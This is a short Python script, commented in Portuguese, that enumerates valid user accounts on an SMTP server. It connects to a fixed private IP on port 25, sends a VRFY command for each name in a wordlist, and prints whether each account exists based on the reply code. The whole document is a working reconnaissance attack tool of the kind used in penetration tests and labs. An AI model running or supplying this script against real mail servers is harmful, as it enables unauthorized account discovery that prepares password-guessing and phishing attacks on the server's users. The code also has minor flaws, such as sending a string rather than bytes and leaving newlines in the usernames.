import socket

ip = "192.168.100.16"
port = 25
timeout_value = 2

def func_xpl_vrfy(_USERNAME):
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout_value)
    connect=s.connect((ip,port))
    banner=s.recv(1024)
    
    command='VRFY ' + _USERNAME + '\n'
    s.send(command)
    result=s.recv(1024)
    return result

with open('userlist.txt') as _DICIONARIO:
    for _USERNAME in _DICIONARIO:
        VRFYTEST=func_xpl_vrfy(_USERNAME)
        VRFYCODE = VRFYTEST[:3]
        if "252" in str(VRFYCODE):
            print("[*] BINDO - O nome do usuario -> " + _USERNAME + " eh uma conta valida!!! ")

        if "550" in str(VRFYCODE):
            print("[!] FALHOU - O nome do usuario " + _USERNAME + " NAO eh uma conta valida!!! ")

        if "503" in str(VRFYCODE):
            print("[!] ERRO - Esse servidor requer autenticacao no SMTP!!! ") 

        if "500" in str(VRFYCODE):
            print("[!] FALHOU - O comando VRFY nao eh suportado nesse servidor!!! ") 



